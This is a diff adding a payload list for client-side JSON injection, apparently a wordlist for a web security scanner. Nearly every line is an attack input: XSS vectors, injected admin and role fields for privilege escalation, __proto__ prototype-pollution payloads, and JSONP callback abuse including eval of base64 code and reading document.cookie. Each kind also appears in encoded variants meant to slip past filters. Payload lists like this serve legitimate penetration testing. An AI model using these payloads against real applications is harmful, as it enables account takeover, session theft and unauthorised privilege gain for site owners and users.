@@ -1,0 +1,87 @@
+# Client-side JSON Injection Payloads
+# These payloads are designed for DOM-based JSON injection attacks
+
+# Basic JSON structure breaking
+","test":"injected
+\"test\":\"injected\"
+"},"injected":"value
+
+# JSON injection with XSS
+","xss":"<script>alert(1)</script>
+\"xss\":\"<img src=x onerror=alert(1)>\"
+"},"xss":"<svg onload=alert(1)>
+
+# JSON injection with function calls
+","eval":"alert(1)
+\"exec\":\"console.log(document.cookie)\"
+"},"callback":"malicious_function
+
+# Boolean manipulation for privilege escalation
+","admin":true,"test":"
+\"isAdmin\":true,\"test\":\"
+"},"authorized":true,"dummy":"
+","role":"admin","test":"
+\"permissions\":[\"admin\"],\"test\":\"
+
+# Array injection
+"],["injected","value
+\"],[\"injected\",\"value\"
+
+# Object injection
+"}},{"injected":"value
+\"}},{\"injected\":\"value\"
+
+# Prototype pollution payloads
+","__proto__":{"isAdmin":true},"test":"
+\"constructor\":{\"prototype\":{\"isAdmin\":true}},\"test\":\"
+"},"__proto__":{"toString":"alert"},"test":"
+","__proto__":{"valueOf":"alert"},"test":"
+
+# JSONP callback manipulation
+callback=malicious_function
+jsonp=alert(1)
+cb=eval(atob("YWxlcnQoMSk="))
+callback=function(){alert(1)}
+jsonp=console.log(document.cookie)
+
+# Nested JSON injection
+","data":{"admin":true},"test":"
+\"config\":{\"isAdmin\":true},\"test\":\"
+
+# JSON with JavaScript code injection
+","script":"<script>alert('JSON_XSS')</script>","test":"
+\"html\":\"<img src=x onerror=alert(document.domain)>\",\"test\":\"
+
+# URL fragment JSON injection (for hash-based)
+#{"admin":true}
+#{"xss":"<script>alert(1)</script>"}
+
+# Double-encoded JSON payloads
+%22%2C%22admin%22%3Atrue%2C%22test%22%3A%22
+%7B%22admin%22%3Atrue%7D
+
+# Unicode-encoded JSON payloads
+\u0022,\u0022admin\u0022:true,\u0022test\u0022:\u0022
+\u007B\u0022admin\u0022:true\u007D
+
+# JSON with HTML entity encoding
+&quot;,&quot;admin&quot;:true,&quot;test&quot;:&quot;
+&#123;&quot;admin&quot;:true&#125;
+
+# Base64 encoded JSON payloads
+eyJhZG1pbiI6dHJ1ZX0=
+eyJ4c3MiOiI8c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+In0=
+
+# JSON injection in different contexts
+' + JSON.stringify({"admin":true}) + '
+" + JSON.stringify({"xss":"<script>alert(1)</script>"}) + "
+
+# Framework-specific JSON injection
+angular.fromJson('{"admin":true}')
+$.parseJSON('{"xss":"<script>alert(1)</script>"}')
+JSON.parse('{"admin":true,"test":"' + payload + '"}')
+
+# Error-inducing payloads
+","test":function(){alert(1)},"dummy":"
+\"test\":undefined,\"dummy\":\"
+"},"test":null,"dummy":"
